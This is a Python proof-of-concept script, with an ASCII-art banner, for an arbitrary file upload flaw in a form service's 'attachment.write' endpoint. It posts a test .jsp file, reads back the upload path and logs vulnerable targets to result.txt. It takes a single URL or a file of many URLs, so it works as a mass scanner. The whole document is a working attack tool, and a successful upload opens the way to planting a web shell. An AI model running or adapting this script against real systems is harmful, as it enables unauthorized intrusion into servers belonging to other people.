import requests
import argparse
import re
import sys

def banner():
    test = """
           __        __  __                                                __        __                               
          |  \      |  \|  \                                              |  \      |  \                              
  _______ | $$____   \$$| $$   __   ______   _______    ______   ________ | $$____   \$$ __    __   ______   __    __ 
 /       \| $$    \ |  \| $$  /  \ /      \ |       \  /      \ |        \| $$    \ |  \|  \  |  \ /      \ |  \  |  \
|  $$$$$$$| $$$$$$$\| $$| $$_/  $$|  $$$$$$\| $$$$$$$\|  $$$$$$\ \$$$$$$$$| $$$$$$$\| $$| $$  | $$|  $$$$$$\| $$  | $$
 \$$    \ | $$  | $$| $$| $$   $$ | $$  | $$| $$  | $$| $$  | $$  /    $$ | $$  | $$| $$| $$  | $$| $$  | $$| $$  | $$
 _\$$$$$$\| $$  | $$| $$| $$$$$$\ | $$__/ $$| $$  | $$| $$__| $$ /  $$$$_ | $$  | $$| $$| $$__/ $$| $$__/ $$| $$__/ $$
|       $$| $$  | $$| $$| $$  \$$\ \$$    $$| $$  | $$ \$$    $$|  $$    \| $$  | $$| $$ \$$    $$ \$$    $$ \$$    $$
 \$$$$$$$  \$$   \$$ \$$ \$$   \$$  \$$$$$$  \$$   \$$ _\$$$$$$$ \$$$$$$$$ \$$   \$$ \$$ _\$$$$$$$  \$$$$$$   \$$$$$$ 
                                                      |  \__| $$                        |  \__| $$                    
                                                       \$$    $$                         \$$    $$                    
                                                        \$$$$$$                           \$$$$$$                 
                                                        @author: LGJ
"""
    print(test)
def poc(url):
    headers= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
    }
    data='''123'''
    requests.packages.urllib3.disable_warnings()
    try:
        req=requests.post(url+"/formservice?service=attachment.write&isattach=false&filename=test1.jsp",headers=headers,timeout=10,verify=False,data=data)
    except:
        print("目标不能访问")
        sys.exit()
    try:
        text=req.text.encode("iso-8859-1").decode("utf-8")
        pattern = r"<root>(.*?)<\/root>"
        match = re.search(pattern, text)
        if match:
            extracted_content = match.group(1)
            print("上传成功  路径: /form/temp/"+extracted_content)
            with open("result.txt","a+",encoding="utf-8") as f:
                f.write(url+"\n")
        else:
            print("没有漏洞")
    except:
        print("没有漏洞")
        sys.exit()


def main():
    banner()
    parser = argparse.ArgumentParser(description='NACOS')
    parser.add_argument("-u", "--url", dest="url", type=str)
    parser.add_argument("-f", "--file", dest="file", type=str)
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        for j in url_list:
            poc(j)

if __name__ == '__main__':
    main()